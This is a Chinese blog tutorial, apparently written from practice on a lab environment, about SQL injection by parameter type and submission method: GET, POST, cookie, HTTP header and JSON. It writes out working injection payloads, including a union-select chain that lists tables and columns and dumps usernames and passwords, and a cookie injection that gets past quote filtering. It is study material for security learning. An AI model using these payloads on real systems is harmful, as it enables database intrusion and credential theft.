      <title>Web漏洞-SQL注入之类型及提交注入</title>
      <link href="/2026/04/10/Web%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5/"/>
      <url>/2026/04/10/Web%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入之类型及提交注入"><a href="#SQL注入之类型及提交注入" class="headerlink" title="SQL注入之类型及提交注入"></a>SQL注入之类型及提交注入</h1><h3 id="1-参数类型"><a href="#1-参数类型" class="headerlink" title="1.参数类型"></a>1.参数类型</h3><p>数字   字符  搜索  JSON</p><h3 id="2-字符"><a href="#2-字符" class="headerlink" title="2.字符"></a>2.字符</h3><p>当  id&#x3D;1时   会显示以下</p><p><img src="https://muziyueheng.oss-cn-zhangjiakou.aliyuncs.com/image-20251010204713782.png" alt="image-20251010204713782">、</p><p>如果更改条件   将id&#x3D;1 改为  username&#x3D;username1   就会报错</p><p><img src="https://muziyueheng.oss-cn-zhangjiakou.aliyuncs.com/image-20251010204843214.png" alt="image-20251010204843214"></p><p>这是因为 username&#x3D;username1    的username1不是内置语句和函数  所以才会报错</p><p>这时候就需要把他括起来  使用单引号      如以下  就会正常显示</p><p><img src="https://muziyueheng.oss-cn-zhangjiakou.aliyuncs.com/image-20251010205146404.png" alt="image-20251010205146404"></p><p><img src="https://muziyueheng.oss-cn-zhangjiakou.aliyuncs.com/image-20251010210738553.png" alt="image-20251010210738553"></p><h3 id="3-搜索"><a href="#3-搜索" class="headerlink" title="3.搜索"></a>3.搜索</h3><p><img src="https://muziyueheng.oss-cn-zhangjiakou.aliyuncs.com/image-20251010211943603.png" alt="image-20251010211943603"></p><p>在搜索的时候  也会多出两个%%   使用就需要过滤掉单引号和%   不然  语句都在里面（不是唯一，，也可能是其他的符号，这时候就多进行尝试）</p><h3 id="4-请求方法"><a href="#4-请求方法" class="headerlink" title="4.请求方法"></a>4.请求方法</h3><p>GET POST REQUEST 等</p><p>查看方式</p><p><img src="https://muziyueheng.oss-cn-zhangjiakou.aliyuncs.com/image-20251010212438806.png" alt="image-20251010212438806"></p><p>不同的请求方式，它请求的数据类型或者大小都不同。一般大数据会采用POST提交</p><p>GET 参数会附加在url后面</p><p>POST 参数包含在请求体中</p><h3 id="5-参数字符型注入测试"><a href="#5-参数字符型注入测试" class="headerlink" title="5.参数字符型注入测试"></a>5.参数字符型注入测试</h3><p>示例一</p><p>在使用 and 1&#x3D;2时   这时页面依然正常</p><p><img src="https://muziyueheng.oss-cn-zhangjiakou.aliyuncs.com/image-20251011155926461.png" alt="image-20251011155926461"></p><p>查看源代码之后发现 $id  是在单引号中  所以 and 1&#x3D;1 是在单引号中</p><p><img src="https://muziyueheng.oss-cn-zhangjiakou.aliyuncs.com/image-20251011160154386.png" alt="image-20251011160154386"></p><p>可以在?id&#x3D;1后加一个单引号把源代码中原本存在的单引号闭合掉 这样就会正常报错</p><p><img src="https://muziyueheng.oss-cn-zhangjiakou.aliyuncs.com/image-20251011160523661.png" alt="image-20251011160523661"></p><p><img src="https://muziyueheng.oss-cn-zhangjiakou.aliyuncs.com/image-20251011161222748.png" alt="image-20251011161222748"></p><p>所以在进行注入的时候要输入?id&#x3D;1’ and ‘1’&#x3D;’1</p><p>显示正常</p><p><img src="https://muziyueheng.oss-cn-zhangjiakou.aliyuncs.com/image-20251011161341689.png" alt="image-20251011161341689"></p><p>?id&#x3D;1’ and ‘1’&#x3D;’1</p><p>不正常  有注入 </p><p><img src="https://muziyueheng.oss-cn-zhangjiakou.aliyuncs.com/image-20251011161402710.png" alt="image-20251011161402710"></p><h3 id="示例二"><a href="#示例二" class="headerlink" title="示例二"></a>示例二</h3><p><img src="https://muziyueheng.oss-cn-zhangjiakou.aliyuncs.com/image-20251011162018424.png" alt="image-20251011162018424"></p><p>$id &#x3D; ‘“‘.$id.’”‘其中出现单引号和双引号</p><p>所以  也可以使用使用双引号去查看源代码中是否有双引号</p><p>加了双引号之后发现报错  说明是存在双引号的</p><p>显示正常</p><p><img src="https://muziyueheng.oss-cn-zhangjiakou.aliyuncs.com/image-20251011163002958.png" alt="image-20251011163002958"></p><p>显示不正常</p><p><img src="https://muziyueheng.oss-cn-zhangjiakou.aliyuncs.com/image-20251011163044867.png" alt="image-20251011163044867"></p><p>这里可以使用–+把源代码中的后面双引号的内容注释掉</p><p><img src="https://muziyueheng.oss-cn-zhangjiakou.aliyuncs.com/image-20251011163221688.png" alt="image-20251011163221688"></p><p><img src="https://muziyueheng.oss-cn-zhangjiakou.aliyuncs.com/image-20251011163358477.png" alt="image-20251011163358477"></p><h3 id="6-POST数据提交注入测试"><a href="#6-POST数据提交注入测试" class="headerlink" title="6.POST数据提交注入测试"></a>6.POST数据提交注入测试</h3><p>一般存在于登录框</p><p>要注意注意提交方式，参数类型。</p><p>使用抓包工具     </p><p><img src="https://muziyueheng.oss-cn-zhangjiakou.aliyuncs.com/image-20251011205219342.png" alt="image-20251011205219342"></p><p>在这个窗口下对此语句进行post注入</p><p><img src="https://muziyueheng.oss-cn-zhangjiakou.aliyuncs.com/image-20251011205352018.png" alt="image-20251011205352018"></p><p>查看该语句源代码中是否存在单引号等</p><p>uname&#x3D;admin and 1&#x3D;2&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</p><p>发现依然显示正常  说明是存在数字类型的</p><p><img src="https://muziyueheng.oss-cn-zhangjiakou.aliyuncs.com/image-20251011205714973.png" alt="image-20251011205714973"></p><p>加上单引号</p><p>uname&#x3D;admin‘ and 1&#x3D;2&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</p><p>报错了 </p><p><img src="https://muziyueheng.oss-cn-zhangjiakou.aliyuncs.com/image-20251011205522989.png" alt="image-20251011205522989"></p><p>那么这时候就开始进行注入</p><p>uname&#x3D;admin’ and 1&#x3D;2 union select 1,2 #&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit  （#是注释后面的语句 和–+一样的意思）</p><p><img src="https://muziyueheng.oss-cn-zhangjiakou.aliyuncs.com/image-20251011210230863.png" alt="image-20251011210230863"></p><p>uname&#x3D;admin’ and 1&#x3D;2 union select database(),2 –+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</p><p>获得库名security</p><img src="https://muziyueheng.oss-cn-zhangjiakou.aliyuncs.com/image-20251011210426028.png" alt="image-20251011210426028" style="zoom:200%;" /><p>uname&#x3D;admin’ and 1&#x3D;2 union select table_name,2 from information_schema.tables where table_schema&#x3D;’security’ #&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit   获得表名 users</p><p><img src="https://muziyueheng.oss-cn-zhangjiakou.aliyuncs.com/image-20251011211450685.png" alt="image-20251011211450685"></p><p>uname&#x3D;admin’ and 1&#x3D;2 union select group_concat(column_name),2 from information_schema.columns where table_name&#x3D;’users’ #&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</p><p>获取所有列名 </p><p><img src="https://muziyueheng.oss-cn-zhangjiakou.aliyuncs.com/image-20251011212120569.png" alt="image-20251011212120569"></p><p>uname&#x3D;admin’ and 1&#x3D;2 union select username,password from security.users #&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</p><p>由此可获得数据</p><p><img src="https://muziyueheng.oss-cn-zhangjiakou.aliyuncs.com/image-20251011212543701.png" alt="image-20251011212543701"></p><h3 id="7-cookie数据提交注入测试"><a href="#7-cookie数据提交注入测试" class="headerlink" title="7.cookie数据提交注入测试"></a>7.cookie数据提交注入测试</h3><p>uname&#x3D;at’ and 1&#x3D;2 union select 1,2,3#&amp;passwd&#x3D;at&amp;submit&#x3D;Submit</p><p>在使用注入语句时  发现注入后 语句发生变化  再查看源码</p><p><img src="https://muziyueheng.oss-cn-zhangjiakou.aliyuncs.com/image-20251011221559248.png" alt="image-20251011221559248"></p><p><img src="https://muziyueheng.oss-cn-zhangjiakou.aliyuncs.com/image-20251011221617237.png" alt="image-20251011221617237"></p><p>再查看源码</p><p>发现了魔术开关</p><p>把一些语句进行了过滤</p><p><img src="https://muziyueheng.oss-cn-zhangjiakou.aliyuncs.com/image-20251011221657931.png" alt="image-20251011221657931"></p><p>那么  这时候可以使用cookie注入  可以绕过一些过滤防护</p><p>如果POST无法返回数据  那就将POST改为GET</p><p>再在数据包中添加一条 Cookie:uname&#x3D;at’ and 1&#x3D;2 union select 1,2,3#</p><p>则可以返回相关数据</p><p><img src="https://muziyueheng.oss-cn-zhangjiakou.aliyuncs.com/image-20251011223340559.png" alt="image-20251011223340559"></p><p><img src="https://muziyueheng.oss-cn-zhangjiakou.aliyuncs.com/image-20251011223318749.png" alt="image-20251011223318749"></p><p>接下来   便可进行注入</p><h3 id="8-HTTP"><a href="#8-HTTP" class="headerlink" title="8.HTTP"></a>8.HTTP</h3><p>在打开的页面中会出现我的IP地址</p><p>就是$IP &#x3D; $_SERVER[‘REMOTE_ADDR’];这天语句的作用</p><p><img src="https://muziyueheng.oss-cn-zhangjiakou.aliyuncs.com/image-20251011224143750.png" alt="image-20251011224143750"></p><p><img src="https://muziyueheng.oss-cn-zhangjiakou.aliyuncs.com/image-20251011224128989.png" alt="image-20251011224128989"></p><p>依然存在过滤函数</p><p>也存在POST    所以在登录框中存在过滤</p><p><img src="https://muziyueheng.oss-cn-zhangjiakou.aliyuncs.com/image-20251011224427775.png" alt="image-20251011224427775"></p><p>该语句是insert 插入语句   （insert 注入）</p><p><img src="https://muziyueheng.oss-cn-zhangjiakou.aliyuncs.com/image-20251011224558312.png" alt="image-20251011224558312"></p><p>对于此类注入要在这里做文章<img src="https://muziyueheng.oss-cn-zhangjiakou.aliyuncs.com/image-20251011225809882.png" alt="image-20251011225809882"></p><h3 id="9-JSON"><a href="#9-JSON" class="headerlink" title="9.JSON"></a>9.JSON</h3><p>其格式是列表形式   在进行注入的时候也要按照类似格式写在相应的地方</p><p>经常出现在app中</p><p><img src="https://muziyueheng.oss-cn-zhangjiakou.aliyuncs.com/image-20251011230617039.png" alt="image-20251011230617039"></p>]]></content>
      
      
      <categories>
          
          <category> Web漏洞 </category>
          
      </categories>
      
      
